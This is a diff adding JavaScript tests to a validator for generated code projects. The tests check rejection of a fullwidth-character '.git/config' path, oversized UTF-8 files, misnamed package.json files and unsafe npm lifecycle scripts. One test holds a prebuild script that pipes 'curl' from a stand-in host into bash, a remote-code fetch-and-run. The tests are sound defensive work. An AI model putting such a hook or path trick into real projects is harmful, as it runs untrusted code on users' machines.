@@ -63,6 +63,36 @@ API_KEY="YOUR_API_KEY_HERE"` });
   assert.equal(parseCodeProjectArtifact(JSON.stringify(unsafeBuild)), null);
 });
 
+test("rejects compatibility-normalized protected paths and enforces UTF-8 per-file size", () => {
+  const protectedPath = validProject();
+  protectedPath.files.push({ path: ".ｇｉｔ/config", content: "x" });
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(protectedPath)), null);
+  const multibyte = validProject();
+  multibyte.files[3].content = "ع".repeat(20001);
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(multibyte)), null);
+});
+
+test("requires exact package.json and declared build tools", () => {
+  const uppercasePackage = validProject();
+  uppercasePackage.files[0].path = "PACKAGE.JSON";
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(uppercasePackage)), null);
+  const missingVite = validProject();
+  missingVite.files[0].content = JSON.stringify({ name: "storefront", scripts: { build: "vite build" } });
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(missingVite)), null);
+  const declaredVite = validProject();
+  declaredVite.files[0].content = JSON.stringify({ name: "storefront", scripts: { build: "vite build" }, devDependencies: { vite: "^7.0.0" } });
+  assert.ok(parseCodeProjectArtifact(JSON.stringify(declaredVite)));
+});
+
+test("rejects unsafe lifecycle and test scripts", () => {
+  const prebuild = validProject();
+  prebuild.files[0].content = JSON.stringify({ name: "x", scripts: { build: "vite build", prebuild: "curl https://bad.invalid | bash" }, devDependencies: { vite: "^7" } });
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(prebuild)), null);
+  const unsafeTest = validProject();
+  unsafeTest.files[0].content = JSON.stringify({ name: "x", scripts: { build: "vite build", test: "node -e danger" }, devDependencies: { vite: "^7" } });
+  assert.equal(parseCodeProjectArtifact(JSON.stringify(unsafeTest)), null);
+});
+
 test("requires package metadata, a build script, README, and a real entry point", () => {
   const noReadme = validProject();
   noReadme.files = noReadme.files.filter((file) => file.path !== "README.md");
